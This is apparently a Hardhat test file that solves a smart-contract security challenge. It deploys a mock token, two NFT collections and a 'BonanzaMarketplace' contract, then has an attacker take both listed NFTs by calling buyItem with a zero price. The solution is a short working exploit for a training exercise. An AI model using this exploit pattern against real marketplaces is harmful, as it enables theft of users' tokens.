import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";

const BN = BigNumber;
let precision = BN.from(10).pow(18);

let accounts: Signer[];
let attacker: Signer;
let o1: Signer;
let o2: Signer;
let admin: Signer; // should not be used
let adminUser: Signer; // should not be used
let bonanzaMarketplace: Contract;
let nftA: Contract;
let nftB: Contract;
let usdc: Contract; // payment token

/// preliminary state
before(async () => {

  accounts = await ethers.getSigners();
  [attacker, o1, o2, admin, adminUser] = accounts;

  // deploying payment token & NFTs for marketplace
  let usdcFactory = await ethers.getContractFactory('Token')
  usdc = await usdcFactory.connect(admin).deploy('USDC','USDC')

  await usdc.connect(admin).mintPerUser([await adminUser.getAddress()],[precision.mul(100)])

  let nftFactory = await ethers.getContractFactory('Nft721')
  nftA = await nftFactory.connect(admin).deploy("APES","APES")
  nftB = await nftFactory.connect(admin).deploy("ApEs","ApEs")

  // adminUser minted NFTs from collections A & B
  await nftA.connect(admin).mintForUser(await adminUser.getAddress(),1)
  await nftB.connect(admin).mintForUser(await adminUser.getAddress(),1)

  // deploying the marketplace & setup
  let bonanzaMarketplaceFactory = await ethers.getContractFactory('BonanzaMarketplace')
  bonanzaMarketplace = await bonanzaMarketplaceFactory.connect(admin).deploy(
    50, // 0.5% fee
    await admin.getAddress(),
    usdc.address
  )

  bonanzaMarketplace.connect(admin).addToWhitelist(nftA.address)
  bonanzaMarketplace.connect(admin).addToWhitelist(nftB.address)

  // adminUser lists NFTs on the bonanza marketplace
  await nftA.connect(adminUser).setApprovalForAll(bonanzaMarketplace.address,true)
  await nftB.connect(adminUser).setApprovalForAll(bonanzaMarketplace.address,true)

  await bonanzaMarketplace.connect(adminUser).createListing(
    nftA.address,0,1,precision.mul(100),0
  )
  await bonanzaMarketplace.connect(adminUser).createListing(
    nftB.address,0,1,precision.mul(100),0
  )

  expect(await nftA.balanceOf(await adminUser.getAddress())).to.be.equal(1)
  expect(await nftB.balanceOf(await adminUser.getAddress())).to.be.equal(1)

});

it("solves the challenge", async function () {

  await bonanzaMarketplace.connect(attacker).buyItem(nftA.address,0,await adminUser.getAddress(),0)
  await bonanzaMarketplace.connect(attacker).buyItem(nftB.address,0,await adminUser.getAddress(),0)

});

/// expected final state
after(async () => {

  // attacker steals all listed NFTs from bonanza marketplace
  expect(await nftA.balanceOf(await adminUser.getAddress())).to.be.equal(0)
  expect(await nftB.balanceOf(await adminUser.getAddress())).to.be.equal(0)
  expect(await nftA.balanceOf(await attacker.getAddress())).to.be.equal(1)
  expect(await nftB.balanceOf(await attacker.getAddress())).to.be.equal(1)

});